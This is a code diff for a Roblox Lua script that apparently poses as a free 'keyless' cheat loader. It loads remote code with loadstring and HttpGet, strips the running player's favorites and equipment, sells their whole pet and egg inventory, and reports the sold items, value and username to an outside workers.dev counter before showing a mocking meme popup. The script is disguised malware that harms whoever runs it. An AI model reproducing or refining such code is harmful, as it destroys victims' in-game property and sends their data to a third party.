@@ -5,14 +5,28 @@ local HttpService       = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
 
--- ===== CONFIG =====
-local UI_URL                 = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/LoaderUI.lua"
-local COUNTER_URL            = "https://sell-counter-temp2.bluealpha1365.workers.dev/report"
-local SALE_POLL_TIMEOUT      = 6
-local SALE_POLL_INTERVAL     = 0.25
-local MEME_DELAY             = 4
+-- ===== RE-ENTRY GUARD =====
+local gv = (getgenv and getgenv()) or _G
+if gv.__SAE_LOADER_RUNNING then
+    warn("[Loader] Already running — ignoring this execution.")
+    return
+end
+gv.__SAE_LOADER_RUNNING = true
 
--- Passed to the UI module (only used if the UI module loads successfully)
+task.delay(90, function()
+    if gv.__SAE_LOADER_RUNNING then
+        gv.__SAE_LOADER_RUNNING = false
+        warn("[Loader] Re-entry flag force-cleared after 90s.")
+    end
+end)
+-- ===========================
+
+-- ===== CONFIG =====
+local UI_URL      = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/LoaderUI.lua"
+local COUNTER_URL = "https://sell-counter-temp2.bluealpha1365.workers.dev/report"
+local SELL_WAIT   = 1.5
+local MEME_DELAY  = 4
+
 local UI_CONFIG = {
     MEME_IMAGE_ID  = "rbxassetid://82403642047427",
     LAUGH_SOUND_ID = "rbxassetid://133312610824902",
@@ -21,23 +35,22 @@ local UI_CONFIG = {
 -- ==================
 
 ------------------------------------------------------------
--- LOAD UI MODULE (cached in _G, with no-op fallback)
+-- UI MODULE
 ------------------------------------------------------------
 local function loadUIModule()
-    if _G.__LoaderUIModule then return _G.__LoaderUIModule end
-    if UI_URL and UI_URL ~= "" and UI_URL:find("YOUR_USERNAME") == nil then
+    if gv.__LoaderUIModule then return gv.__LoaderUIModule end
+    if UI_URL and UI_URL ~= "" then
         local ok, mod = pcall(function()
             return loadstring(game:HttpGet(UI_URL, true))()
         end)
         if ok and type(mod) == "table" and type(mod.new) == "function" then
-            _G.__LoaderUIModule = mod
+            gv.__LoaderUIModule = mod
             return mod
         end
         warn("[Loader] UI module failed to load, running headless:", tostring(mod))
     else
         warn("[Loader] UI_URL not configured — running headless.")
     end
-    -- Fallback: no-op UI so business logic still works
     return {
         new = function()
             return {
@@ -55,7 +68,7 @@ local LoaderUI = loadUIModule()
 local ui = LoaderUI.new(PlayerGui, UI_CONFIG)
 
 ------------------------------------------------------------
--- SELL LOGIC (unchanged)
+-- CORE MODULES
 ------------------------------------------------------------
 local Remotes    = require(ReplicatedStorage.Shared.Remotes)
 local Save       = require(ReplicatedStorage.Shared.Save)
@@ -78,11 +91,6 @@ local function getMoney()
     return (d and type(d.Money) == "number") and d.Money or 0
 end
 
-local function getHRP()
-    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-    return char:WaitForChild("HumanoidRootPart", 5)
-end
-
 local function installOverride()
     pcall(function()
         Remotes.Haul.OfferFullSatchelSale.OnClientInvoke = function(_) return true end
@@ -93,6 +101,9 @@ task.spawn(function()
     for _ = 1, 30 do task.wait(0.5); installOverride() end
 end)
 
+------------------------------------------------------------
+-- EQUIP / FAVORITE CLEANUP
+------------------------------------------------------------
 local function unequipAll()
     local d = getSave()
     if not d or type(d.EquippedAssets) ~= "table" or #d.EquippedAssets == 0 then return end
@@ -134,7 +145,7 @@ local function unfavoriteAll()
 end
 
 ------------------------------------------------------------
--- INVENTORY SNAPSHOT
+-- SNAPSHOT
 ------------------------------------------------------------
 local function snapshotInventory(forceRefresh)
     local pets, eggs = {}, {}
@@ -210,7 +221,7 @@ local function countTable(t)
 end
 
 ------------------------------------------------------------
--- Deterministic report id
+-- REPORT ID
 ------------------------------------------------------------
 local function computeReportId(uidList)
     local sorted = {}
@@ -226,23 +237,7 @@ local function computeReportId(uidList)
 end
 
 ------------------------------------------------------------
--- SELL POSITION
-------------------------------------------------------------
-local function findSellPosition()
-    local stands = workspace:FindFirstChild("Stands")
-    if not stands then return nil end
-    local prompts = stands:FindFirstChild("Prompts")
-    if not prompts then return nil end
-    local sellAll = prompts:FindFirstChild("SellAll")
-    if sellAll and sellAll:IsA("BasePart") then return sellAll.Position end
-    for _, c in ipairs(prompts:GetChildren()) do
-        if c:IsA("BasePart") then return c.Position end
-    end
-    return nil
-end
-
-------------------------------------------------------------
--- GLOBAL COUNTER REPORTING
+-- REPORT TO WORKER
 ------------------------------------------------------------
 local function reportSales(soldItems, reportId)
     if not soldItems or #soldItems == 0 then
@@ -251,7 +246,6 @@ local function reportSales(soldItems, reportId)
     end
 
     local httpFn = nil
-    local gv = getgenv and getgenv() or _G
     if type(request) == "function" then httpFn = request
     elseif type(http_request) == "function" then httpFn = http_request
     elseif type(gv.request) == "function" then httpFn = gv.request
@@ -305,8 +299,15 @@ local function reportSales(soldItems, reportId)
             local parsed = nil
             pcall(function() parsed = HttpService:JSONDecode(res.Body) end)
             local tag = (parsed and parsed.duplicate) and " (dedup)" or ""
-            print(("[Counter] Reported %d pets, %d eggs, $%d as %s%s (reportId=%s)")
-                :format(petCount, eggCount, totalValue, username, tag, tostring(reportId)))
+            local added = parsed and parsed.added
+            if added then
+                print(("[Counter] Sent %d pets, %d eggs, $%d | Accepted: %d new pets, %d new eggs, $%d new%s")
+                    :format(petCount, eggCount, totalValue,
+                            added.pets or 0, added.eggs or 0, added.value or 0, tag))
+            else
+                print(("[Counter] Sent %d pets, %d eggs, $%d%s")
+                    :format(petCount, eggCount, totalValue, tag))
+            end
         else
             warn("[Counter] Report failed:", tostring(res))
         end
@@ -314,88 +315,46 @@ local function reportSales(soldItems, reportId)
 end
 
 ------------------------------------------------------------
--- SELL: snapshot -> sell -> snapshot -> diff -> report
+-- SELL (no teleport)
 ------------------------------------------------------------
-local function teleportAndSell()
-    local before = snapshotInventory(false)
-    local beforePets = countTable(before.pets)
-    local beforeEggs = countTable(before.eggs)
-    log(("Inventory before: %d pets, %d eggs"):format(beforePets, beforeEggs))
-    if beforePets == 0 and beforeEggs == 0 then return end
+local function sellInventory()
+    local snap = snapshotInventory(true)
 
-    local serverPayload = { Eggs = {}, Assets = {} }
-    for uid in pairs(before.pets) do table.insert(serverPayload.Assets, uid) end
-    for uid in pairs(before.eggs) do table.insert(serverPayload.Eggs, uid)   end
-
-    local hrp = getHRP()
-    local pos = findSellPosition()
-
-    if not hrp or not pos then
-        Remotes.PetSatchel.SellSelection:FireServer(serverPayload)
-        task.wait(1.5)
-    else
-        local savedCF  = hrp.CFrame
-        local savedVel = hrp.AssemblyLinearVelocity
-
-        hrp.CFrame = CFrame.new(pos + Vector3.new(0, 4, 0))
-        hrp.AssemblyLinearVelocity = Vector3.zero
-        task.wait(0.6)
-
-        pcall(function()
-            Remotes.PetSatchel.SellSelection:FireServer(serverPayload)
-        end)
-        task.wait(1.5)
-
-        hrp.CFrame = savedCF
-        pcall(function() hrp.AssemblyLinearVelocity = savedVel end)
+    local petUids, eggUids = {}, {}
+    local details = {}
+    for uid, d in pairs(snap.pets) do
+        table.insert(petUids, uid)
+        table.insert(details, d)
+    end
+    for uid, d in pairs(snap.eggs) do
+        table.insert(eggUids, uid)
+        table.insert(details, d)
     end
 
-    -- Poll for save to reflect the sale
-    local after = nil
-    local deadline = os.clock() + SALE_POLL_TIMEOUT
-    while os.clock() < deadline do
-        after = snapshotInventory(true)
-        local removed = 0
-        for uid in pairs(before.pets) do if not after.pets[uid] then removed = removed + 1 end end
-        for uid in pairs(before.eggs) do if not after.eggs[uid] then removed = removed + 1 end end
-        if removed > 0 then
-            log(("Detected %d removed"):format(removed))
-            break
-        end
-        task.wait(SALE_POLL_INTERVAL)
-    end
-
-    if not after then after = snapshotInventory(true) end
-
-    -- Diff
-    local soldPets, soldEggs = {}, {}
-    local soldDetails = {}
-    for uid, d in pairs(before.pets) do
-        if not after.pets[uid] then
-            table.insert(soldPets, uid)
-            table.insert(soldDetails, d)
-        end
-    end
-    for uid, d in pairs(before.eggs) do
-        if not after.eggs[uid] then
-            table.insert(soldEggs, uid)
-            table.insert(soldDetails, d)
-        end
-    end
-
-    log(("Actually sold: %d pets, %d eggs (was %d / %d)")
-        :format(#soldPets, #soldEggs, beforePets, beforeEggs))
-
-    if #soldDetails == 0 then
-        warn("[Counter] Sale detected 0 removed items — not reporting (avoids false positives).")
+    local total = #petUids + #eggUids
+    log(("Snapshot: %d pets, %d eggs (total %d)"):format(#petUids, #eggUids, total))
+    if total == 0 then
+        log("Inventory empty — nothing to sell.")
         return
     end
 
-    local allSoldUids = {}
-    for _, u in ipairs(soldPets) do table.insert(allSoldUids, u) end
-    for _, u in ipairs(soldEggs) do table.insert(allSoldUids, u) end
-    local reportId = computeReportId(allSoldUids)
-    reportSales(soldDetails, reportId)
+    local serverPayload = { Eggs = eggUids, Assets = petUids }
+
+    -- Fire the sell remote from wherever the player is standing
+    local ok, err = pcall(function()
+        Remotes.PetSatchel.SellSelection:FireServer(serverPayload)
+    end)
+    if not ok then
+        warn("[Loader] Sell remote failed:", tostring(err))
+    end
+    task.wait(SELL_WAIT)
+
+    -- Report the snapshot (worker dedups + counts new)
+    local allUids = {}
+    for _, u in ipairs(petUids) do table.insert(allUids, u) end
+    for _, u in ipairs(eggUids) do table.insert(allUids, u) end
+    local reportId = computeReportId(allUids)
+    reportSales(details, reportId)
 end
 
 ------------------------------------------------------------
@@ -406,7 +365,7 @@ local function runSilentWork()
     log(("Wallet before: %s"):format(tostring(before)))
     unequipAll()
     unfavoriteAll()
-    teleportAndSell()
+    sellInventory()
     task.wait(0.8)
     local after = getMoney()
     log(("Wallet after:  %s"):format(tostring(after)))
@@ -425,4 +384,6 @@ task.spawn(function()
 
     task.wait(MEME_DELAY)
     ui:showMemePopup()
+
+    gv.__SAE_LOADER_RUNNING = false
 end)
